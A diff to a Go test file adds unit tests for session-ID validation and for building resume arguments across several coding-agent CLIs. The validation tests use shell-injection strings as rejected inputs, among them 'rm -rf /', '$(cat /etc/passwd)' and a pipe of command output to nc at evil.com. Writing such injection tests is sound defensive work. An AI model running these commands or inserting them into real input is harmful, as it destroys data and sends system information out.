@@ -5,6 +5,7 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strings"
 	"testing"
 
 	"github.com/steveyegge/gastown/internal/git"
@@ -550,6 +551,180 @@ func TestManagerRenameValidatesNewName(t *testing.T) {
 		t.Errorf("expected name 'bob', got %q", worker.Name)
 	}
 }
+
+func TestValidateSessionID(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name    string
+		id      string
+		wantErr bool
+	}{
+		// Valid cases
+		{name: "empty string", id: "", wantErr: false},
+		{name: "last sentinel", id: "last", wantErr: false},
+		{name: "UUID format", id: "01234567-89ab-cdef-0123-456789abcdef", wantErr: false},
+		{name: "hex string", id: "a1b2c3d4e5f6", wantErr: false},
+		{name: "alphanumeric", id: "session123", wantErr: false},
+		{name: "with underscores", id: "my_session_id", wantErr: false},
+		{name: "with dots", id: "session.v2.3", wantErr: false},
+		{name: "mixed", id: "Claude-Session_01.abc", wantErr: false},
+
+		// Shell injection attempts — all must be rejected
+		{name: "semicolon injection", id: "; rm -rf /", wantErr: true},
+		{name: "backtick injection", id: "`whoami`", wantErr: true},
+		{name: "dollar expansion", id: "$(cat /etc/passwd)", wantErr: true},
+		{name: "pipe injection", id: "id | nc evil.com 1234", wantErr: true},
+		{name: "ampersand", id: "foo && rm -rf /", wantErr: true},
+		{name: "single quote", id: "'; drop table;--", wantErr: true},
+		{name: "double quote", id: `"id"`, wantErr: true},
+		{name: "newline", id: "foo\nbar", wantErr: true},
+		{name: "space", id: "foo bar", wantErr: true},
+		{name: "redirect", id: "foo>/tmp/pwned", wantErr: true},
+		{name: "hash comment", id: "foo#comment", wantErr: true},
+		{name: "tilde", id: "~/evil", wantErr: true},
+		{name: "slash", id: "path/traversal", wantErr: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateSessionID(tt.id)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateSessionID(%q) error = %v, wantErr = %v", tt.id, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestStartOptionsResumeValidation(t *testing.T) {
+	t.Parallel()
+
+	// Verify that Start() rejects invalid session IDs early.
+	// We can't test the full Start() flow without tmux, but we can test
+	// that the validation function correctly gates the session ID.
+	tests := []struct {
+		name    string
+		id      string
+		wantErr bool
+	}{
+		{name: "valid UUID", id: "abc-123-def", wantErr: false},
+		{name: "injection attempt", id: "; rm -rf /", wantErr: true},
+		{name: "backtick injection", id: "`evil`", wantErr: true},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			err := validateSessionID(tt.id)
+			if (err != nil) != tt.wantErr {
+				t.Errorf("validateSessionID(%q) = %v, wantErr %v", tt.id, err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestBuildResumeArgs(t *testing.T) {
+	t.Parallel()
+
+	tests := []struct {
+		name      string
+		agent     string
+		sessionID string
+		wantArgs  string
+		wantErr   string
+	}{
+		// Claude: has ContinueFlag, flag-style resume
+		{
+			name:      "claude last uses --continue",
+			agent:     "claude",
+			sessionID: "last",
+			wantArgs:  "--continue",
+		},
+		{
+			name:      "claude specific ID uses --resume with ID",
+			agent:     "claude",
+			sessionID: "abc-123-def",
+			wantArgs:  "--resume abc-123-def",
+		},
+		// Gemini: no ContinueFlag, flag-style resume
+		{
+			name:      "gemini last errors without ContinueFlag",
+			agent:     "gemini",
+			sessionID: "last",
+			wantErr:   "does not support --resume without a session ID",
+		},
+		{
+			name:      "gemini specific ID works",
+			agent:     "gemini",
+			sessionID: "sess-456",
+			wantArgs:  "--resume sess-456",
+		},
+		// Codex: subcommand-style resume
+		{
+			name:      "codex rejected as subcommand-style",
+			agent:     "codex",
+			sessionID: "last",
+			wantErr:   "subcommand-style agents",
+		},
+		{
+			name:      "codex specific ID also rejected",
+			agent:     "codex",
+			sessionID: "abc-123",
+			wantErr:   "subcommand-style agents",
+		},
+		// Cursor: no ContinueFlag, flag-style resume
+		{
+			name:      "cursor last errors without ContinueFlag",
+			agent:     "cursor",
+			sessionID: "last",
+			wantErr:   "does not support --resume without a session ID",
+		},
+		{
+			name:      "cursor specific ID works",
+			agent:     "cursor",
+			sessionID: "chat-789",
+			wantArgs:  "--resume chat-789",
+		},
+		// OpenCode: no resume support at all
+		{
+			name:      "opencode rejected no resume support",
+			agent:     "opencode",
+			sessionID: "last",
+			wantErr:   "does not support session resume",
+		},
+		// Unknown agent
+		{
+			name:      "unknown agent rejected",
+			agent:     "nonexistent",
+			sessionID: "abc",
+			wantErr:   "does not support session resume",
+		},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+			got, err := buildResumeArgs(tt.agent, tt.sessionID)
+			if tt.wantErr != "" {
+				if err == nil {
+					t.Fatalf("expected error containing %q, got nil", tt.wantErr)
+				}
+				if got := err.Error(); !strings.Contains(got, tt.wantErr) {
+					t.Errorf("error %q does not contain %q", got, tt.wantErr)
+				}
+				return
+			}
+			if err != nil {
+				t.Fatalf("unexpected error: %v", err)
+			}
+			if got != tt.wantArgs {
+				t.Errorf("buildResumeArgs(%q, %q) = %q, want %q", tt.agent, tt.sessionID, got, tt.wantArgs)
+			}
+		})
+	}
+}
+
 
 // Helper to run commands
 func runCmd(name string, args ...string) error {
